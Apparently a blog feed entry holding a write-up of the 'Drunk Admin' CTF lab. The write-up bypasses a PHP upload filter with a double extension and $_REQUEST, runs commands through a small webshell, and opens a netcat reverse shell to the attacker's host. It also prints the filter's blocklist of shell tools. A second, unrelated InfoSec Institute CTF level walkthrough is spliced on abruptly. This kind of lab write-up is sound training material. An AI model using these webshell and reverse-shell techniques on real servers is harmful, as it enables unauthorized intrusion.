    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>

<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>

<h1>Recon</h1>

<p>Started with an Nmap scan, I only keep here the relevant output:</p>

<p><code>plain
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))
</code></p>

<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>

<p><img class="center" src="/images/pentest/drunkadmin/tripios.png" title="&lsquo;tripios&rsquo; &lsquo;tripios image hosting&rsquo;" ></p>

<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>

<h1>Exploit</h1>

<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>

<p><img class="center" src="/images/pentest/drunkadmin/upload.png" title="&lsquo;upload&rsquo; &lsquo;uploaded image&rsquo;" ></p>

<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>

<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>

<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>

<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>

<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>

<p>With this information, I made another simple script to see if I can get command execution on the target:</p>

<p><code>php
&lt;?php
echo exec($_GET['cmd']);
?&gt;
</code></p>

<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>

<p><code>php
echo exec('whoami');
</code></p>

<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>

<p><code>php
echo exec($_REQUEST['cmd']);
</code></p>

<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>

<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>

<p><code>plain
root@pwnbox:~#nc -vvnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
ls /home
bob
ls /home/bob/
Documents
public_html
</code></p>

<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>

<p><code>plain
ls -a /var/www
.
..
.htaccess
.proof
image.php
images
index.php
info.php
myphp.php
style
upload.php
xmm.html
</code></p>

<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>

<p>``` plain
cat .proof</p>

<h6>#</h6>

<h1>Drunk Admin Challenge</h1>

<h1>by @anestisb</h1>

<h6>#</h6>

<p>bob> Great work.
bob> Meet me there.
&hellip;> ?
bob> What? You don&rsquo;t know where?
bob> Work a little more your post</p>

<pre><code> exploitation skills.
</code></pre>

<p>Secret Code:
TGglMUxecjJDSDclN1Ej</p>

<p>Mail me your methods at:
<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x61;&#110;&#x65;&#x73;&#116;&#105;&#115;&#64;&#98;&#101;&#99;&#x68;&#116;&#x73;&#x6f;&#117;&#100;&#x69;&#115;&#x2e;&#99;&#111;&#x6d;">&#x61;&#110;&#x65;&#115;&#116;&#x69;&#x73;&#64;&#98;&#x65;&#x63;&#x68;&#x74;&#x73;&#x6f;&#117;&#100;&#x69;&#115;&#x2e;&#x63;&#x6f;&#x6d;</a>
```</p>

<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>

<p><code>plain
ls /home/bob/public_html
encrypt.php
include
index.php
</code></p>

<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>

<p><img class="center" src="/images/pentest/drunkadmin/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret decryption&rsquo;" ></p>

<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>

<p>``` python</p>

<p>import base64
import binascii</p>

<p>testme = raw_input(&ldquo;Enter string to check if base64: &rdquo;)</p>

<p>try:</p>

<pre><code>base64.decodestring(testme)
print base64.decodestring(testme)
</code></pre>

<p>except binascii.Error:</p>

<pre><code>print "[x] Sorry, this isn't base64"
</code></pre>

<p>```</p>

<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>

<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>

<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>

<p><img class="center" src="/images/pentest/drunkadmin/location.png" title="&lsquo;meeting location&rsquo; &lsquo;secret location&rsquo;" ></p>

<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>

<p>``` php
if(isset($_POST[&lsquo;Submit&rsquo;]) &amp;&amp; !$errors) {</p>

<pre><code>$file = file_get_contents("./images/$image_name");
if( strpos($file,"perl") ||
strpos($file,"bash") ||
strpos($file,"sh -c") ||
strpos($file,"python") ||
strpos($file,"nc ") ||
strpos($file,"netcat") ||
strpos($file,"base64") ||
strpos($file,"ruby") ||
strpos($file,"fsockopen") ||
strpos($file,"xterm") ||
strpos($file,"gcc") ||
strpos($file,'$_GET') ||
strpos($file,'$_POST') ||
strpos($file,'$_SERVER') ||
strpos($file,'$_FILES') ||
strpos($file,'$_COOKIE') )
{ 
echo "&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;"; 
exec("rm ./images/$image_name");
die;
}
</code></pre>

<p>```</p>

<p>Nice twist on this file upload vulnerability!</p>

<h1>Report</h1>

<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>

<ul>
<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
</ul>


<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>

<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>

<h3>Level 1</h3>

<p>This is straightforward, just listen to Yoda:</p>

<p><img class="center" src="/images/infosec_institute_ctf/level1.png" title="&lsquo;level1&rsquo; &lsquo;level1&rsquo;" ></p>

<p>You can find the flag in the source: <code>infosec_flagis_welcome</code></p>

<h3>Level 2</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level2.png" title="&lsquo;level2&rsquo; &lsquo;level2&rsquo;" ></p>

<p>Found the image in the source:</p>

<p><code>html
&lt;img src="img/leveltwo.jpeg" /&gt;
</code>
When clicking on it, there is this error:</p>

<p><code>The image “view-source:<a href="http://ctf.infosecinstitute.com/img/leveltwo.jpeg%E2%80%9D">http://ctf.infosecinstitute.com/img/leveltwo.jpeg%E2%80%9D</a> cannot be displayed because it contains errors.</code></p>

<p>Downloaded it and ran <em>strings</em> on it:</p>

<p><code>plain
root@kali:~/Desktop# strings leveltwo.jpeg
aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=
</code></p>

<p>Well, well. This isn&rsquo;t suspicious at all! :D After you Base64 decode it, you get the flag: <code>infosec_flagis_wearejuststarting</code></p>

<h3>Level 3</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level3.png" title="&lsquo;level3&rsquo; &lsquo;level3&rsquo;" ></p>

<p>I used an <a href="http://www.onlinebarcodereader.com/">online barcode scanner</a> that produced this output: <code>.. &ndash;. ..&ndash;. &mdash;&ndash; &hellip; . &ndash;.&ndash;. ..&ndash;. .&ndash;.. .&ndash; &mdash;. .. &hellip; &mdash; &mdash;&ndash; .&ndash;. &hellip; .. &ndash;. &mdash;.</code>. Well, that seems familiar..Morse code! Used <a href="http://www.onlineconversion.com/morse_code.htm">this site</a> to decode it: <code>INFOSECFLAGISMORSING</code></p>

<h3>Level 4</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level4.png" title="&lsquo;level4&rsquo; &lsquo;level4&rsquo;" ></p>

<p>If you hover over the image with your mouse, a popup appears with the message <em>Stop poking me!</em>. Looking in the source, the Javascript function responsible for that is called <code>poke()</code>, and you can find it in the <code>custom.js</code> file. All it does is alert the message. I spent some time here going in a wrong direction, disabling Javascript, and trying to see if something is hidden in the image. The hint states HTTP, and I did look at the headers and all, and it&rsquo;s not often that you see a cookie called <em>fusrodah</em>. But initially I didn&rsquo;t think it was pertaining to this specific level, because it was present in the requests to other levels as well. But when I hit a blank on everything else, I returned to it and ran it in some decoders:</p>

<p><code>plain
fusrodah=vasbfrp_syntvf_jrybirpbbxvrf
</code></p>

<p>And I hit the jackpot with a Caesar shift of 13: <code>infosec_flagis_welovecookies</code></p>

<h3>Level 5</h3>

<p>When you click on Level 5, you immediatelly get a popup saying <em>Hacker!!!</em>. I disabled Javascript to see this image:</p>

<p><img class="center" src="/images/infosec_institute_ctf/level5.png" title="&lsquo;level5&rsquo; &lsquo;level5&rsquo;" ></p>

<p>Right, back to the thing I hate most, steganography. Stegdetect didn&rsquo;t find anything, and I didn&rsquo;t have any luck with StegExpose either. Surprisingly, an online tool came to help: <a href="https://futureboy.us/stegano/decinput.html">https://futureboy.us/stegano/decinput.html</a></p>

<p>The output was this string:</p>

<p><code>plain
01101001011011100110011001101111011100110110010101100011010111110110011001101100011000010110011101101001011100110101111101110011011101000110010101100111011000010110110001101001011001010110111001110011
</code></p>

<p>which I then ran in a binary decoder: <code>infosec_flagis_stegaliens</code></p>

<h3>Level 6</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level6.png" title="&lsquo;level6&rsquo; &lsquo;level6&rsquo;" ></p>

<p>Packet analysis is not really my thing, so the way I solved this was by just following streams until I hit on something potentially interesting: the string <code>696e666f7365635f666c616769735f736e6966666564</code>, contained in the first UDP packet, with a source and destination of 127.0.0.1. This was actually the hex encoded flag: <code>infosec_flagis_sniffed</code></p>

<h3>Level 7</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level7.png" title="&lsquo;level7&rsquo; &lsquo;level7&rsquo;" ></p>

<p>I tried to manually navigate to levelseven.php and all I got was a blank page. But when I looked at the request with Live HTTP Headers, I noticed this: <code>HTTP/1.0 200 aW5mb3NlY19mbGFnaXNfeW91Zm91bmRpdA==</code>. A base64 encoded string&hellip;and decoding it gives the flag: <code>infosec_flagis_youfoundit</code></p>

<h3>Level 8</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level8.png" title="&lsquo;level8&rsquo; &lsquo;level8&rsquo;" ></p>

<p>Well, didn&rsquo;t expect to solve it just by running <em>strings</em>, but that&rsquo;s all you need to do! :D The flag is in the <em>strings</em> output: <code>infosec_flagis_0x1a</code></p>

<h3>Level 9</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level9.png" title="&lsquo;level9&rsquo; &lsquo;level9&rsquo;" ></p>

<p>No SQLi involved here..so I googled for Cisco IDS Web Login System password. Eventually I found the credentials that work on <a href="http://www.anameless.com/blog/default-passwords.html">this page</a> that contains default passwords for a number of devices. The ones that worked were <code>root:attack</code>. A popup appeared with the flag <code>ssaptluafed_sigalf_cesofni</code>, which is the reverse for <code>infosec_flagis_defaultpass</code></p>

<h3>Level 10</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level10.png" title="&lsquo;level10&rsquo; &lsquo;level10&rsquo;" ></p>

<p>Played the .wav file, it sounded like something being fast forwarded. So I launched Audacity, and under Effect->Change Speed, you can play with the Speed Multiplier (some 0.20 and lower) until you hear a voice telling you the flag: <code>infosec_flagis_sound</code></p>

<h3>Level 11</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level11.png" title="&lsquo;level11&rsquo; &lsquo;level11&rsquo;" ></p>

<p>Right, that huge PHP image is suspicious. I downloaded it and ran <em>strings</em> on it to begin with, and:</p>

<p><code>plain
infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsaWRlX2xvZ29fbGFyZ2UuZ2lm
</code></p>

<p>Base64? Yes it is! Decoding it gives the address of another image: <a href="http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif">http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif</a></p>

<p><img class="center" src="/images/infosec_institute_ctf/powerslide.png" title="&lsquo;powerslide&rsquo; &lsquo;powerslide&rsquo;" ></p>

<p>Couldn&rsquo;t find anything hidden in this image, so I guess <code>infosec_flagis_powerslide</code></p>

<h3>Level 12</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level12.png" title="&lsquo;level12&rsquo; &lsquo;level12&rsquo;" ></p>

<p>Spent some time scratching my head at this one, because I couldn&rsquo;t find anything. Since I was just jumping over the initial section of the page source, with the CSS files and all, I was missing the relevant information. So, if you look in the source and you compare it with other pages, you can see that there is a new CSS file, called <em>design.css</em>, with the following inside:</p>

<p>``` css
.thisloveis{</p>

<pre><code>color: #696e666f7365635f666c616769735f686579696d6e6f7461636f6c6f72;
</code></pre>

<p>}
```</p>

<p>And if you decode that hex string, you get the flag: <code>infosec_flagis_heyimnotacolor</code></p>

<h3>Level 13</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level13.png" title="&lsquo;level13&rsquo; &lsquo;level13&rsquo;" ></p>

<p>I kept trying editing the URL and adding file extensions commonly associated with backup files from <a href="http://www.file-extensions.org/filetype/extension/name/backup-files">this list</a>. Eventually, stumbled upon one that works: the <em>.old</em> file extension.</p>

<p><a href="http://file.org/extension/old">What is an OLD file?</a>:</p>

<blockquote><p>Files that contain the .old file extension are most commonly used to indicate that a file on a user&rsquo;s hard drive is a backup copy of a newer
version of the file. The .old extension is given to the file name when the newer version of the file is saved within the associated computer
application.</p>

<p>The initial file extension is often kept intact when the .old file extension is assigned to a file. For example, if the original version of a file
is saved as mydocument.doc, then when a new version of the file is created that version will also be saved with the name of mydocument.doc.
However, in order to store a copy of the old version of the file, the original version will be saved with the name as mydocument.doc.old.</p></blockquote>

<p>So when I added <em>.old</em> to the URL, I got a message if I want to open or download levelthirteen.php.old. Ok, now we&rsquo;re getting somewhere! Ran <em>strings</em> on it (again!) and noticed an extra something in the source:</p>

<p>``` html
/* <img src="img/clippy1.jpg" class="imahe" /> <br /> <br /></p>

<pre><code>&lt;p&gt;Do you want to download this mysterious file?&lt;/p&gt;
&lt;a href="misc/imadecoy"&gt;
  &lt;button class="btn"&gt;Yes&lt;/button&gt;
&lt;/a&gt;
&lt;a href="index.php"&gt;
  &lt;button class="btn"&gt;No&lt;/button&gt;
&lt;/a&gt;
*/
</code></pre>

<p>```</p>

<p>I went to <a href="http://ctf.infosecinstitute.com/misc/imadecoy">http://ctf.infosecinstitute.com/misc/imadecoy</a> and you can download the mysterious file. Apparently it&rsquo;s another job for Wireshark:</p>

<p><code>plain
root@kali:~/Desktop# file imadecoy
imadecoy: tcpdump capture file (little-endian) - version 2.4 (Linux "cooked", capture length 65535)
</code></p>

<p>Ok, more random following streams and trying to glean what&rsquo;s interesting. Eventually, I reached this part:</p>

<p><img class="center" src="/images/infosec_institute_ctf/imadecoy.png" title="&lsquo;imadecoy&rsquo; &lsquo;imadecoy&rsquo;" ></p>

<p>The GET request for that HoneyPY.PNG image occurs a few times after first spotting it. So the image might be interesting. And it&rsquo;s possible to reconstruct it from the packet file! Click on the relevant packet:</p>

<p><code>plain
633 46.399534   127.0.0.1   127.0.0.1   HTTP    1955    HTTP/1.1 200 OK  (PNG)
</code></p>

<p>Then go to File->Export Objects->HTTP. Wireshark will then give you all the HTTP objects list:</p>

<p><img class="center" src="/images/infosec_institute_ctf/http_objects.png" title="&lsquo;http object list&rsquo; &lsquo;http objects&rsquo;" ></p>

<p>We&rsquo;re only interested in the image, which is the last one. I saved it, and&hellip;</p>

<p>The file is a phpMyAdmin SQL Dump. If you scroll through it, towards the end there will be this table:</p>

<p>``` plain</p>

<h2>&mdash; Dumping data for table <code>friends</code></h2>

<p>INSERT INTO <code>friends</code> (<code>id</code>, <code>name</code>, <code>address</code>, <code>status</code>) VALUES
(102, &lsquo;Sasha Grey&rsquo;, &lsquo;Vatican City&rsquo;, &lsquo;Active&rsquo;),
(101, &lsquo;Andres Bonifacio&rsquo;, &lsquo;Tondo, Manila&rsquo;, &lsquo;Active&rsquo;),
(103, &lsquo;lol&rsquo;, &lsquo;what the???&rsquo;, &lsquo;Inactive&rsquo;),
(104, &lsquo;\u0069\u006e\u0066\u006f\u0073\u0065\u0063\u005f\u0066\u006c\u0061\u0067\u0069\u0073\u005f\u0077\u0068\u0061\u0074\u0073\u006f\u0072\u0063\u0065\u0072\u0079\u0069\u0073\u0074\u0068\u0069\u0073&rsquo;, &lsquo;annoying&rsquo;, &lsquo;0x0a&rsquo;);
```</p>

<p>Used <a href="http://ddecode.com/hexdecoder/">this decoder</a> to decode the not-at-all conspicuous string and: <code>infosec_flagis_whatsorceryisthis</code> ! :D</p>

<h3>Level 15</h3>

<p>Something seems wrong with the server and I get a (real) 404 error for this level only. When it works again I will update this section</p>
